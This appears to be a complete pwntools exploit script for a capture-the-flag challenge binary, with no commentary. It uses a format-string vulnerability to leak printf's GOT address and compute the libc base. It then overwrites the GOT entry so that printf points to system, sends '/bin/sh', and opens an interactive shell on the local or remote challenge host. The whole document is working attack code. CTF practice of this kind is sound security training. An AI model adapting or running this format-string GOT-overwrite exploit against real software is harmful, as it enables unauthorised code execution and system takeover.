from pwn import *

if args["DEBUG"]:
    p = gdb.debug(
        "./bin",
        """
        break main
        continue
        """,
        env={"LD_PRELOAD": "./libc.so.6"}
    )
    
elif args["REMOTE"]:
    p = remote(host="cyberchallenge.disi.unitn.it", port=50230)
else:
    p = process('./bin', env={"LD_PRELOAD": "./libc.so.6"})

libc = ELF("./libc.so.6", checksec=False)
binary = ELF("./bin", checksec=False)
context.binary = binary
printf_offset = libc.symbols["printf"]
system_offset = libc.symbols["system"]

fmt_offset = 6
printf_got = binary.got['printf']

payload = f"%{fmt_offset + 3}$s".encode()
payload += b" " * (24 - len(payload))
payload += p64(printf_got)

p.sendlineafter(b"> ", payload)
printf_address = p.recv(6) + b'\x00\x00'
printf_address = int.from_bytes(printf_address,"little")


libc_base = printf_address - printf_offset
system_address = libc_base + system_offset

system_address = hex(system_address)[9:]

payload = f"%{int(system_address, 16)}c%{fmt_offset + 3}$hn".encode()
payload += b" " * (24 - len(payload))
payload += p64(binary.got["printf"])

p.sendlineafter(b"> ", payload)
p.sendline(b"/bin/sh")
p.clean()
p.interactive()
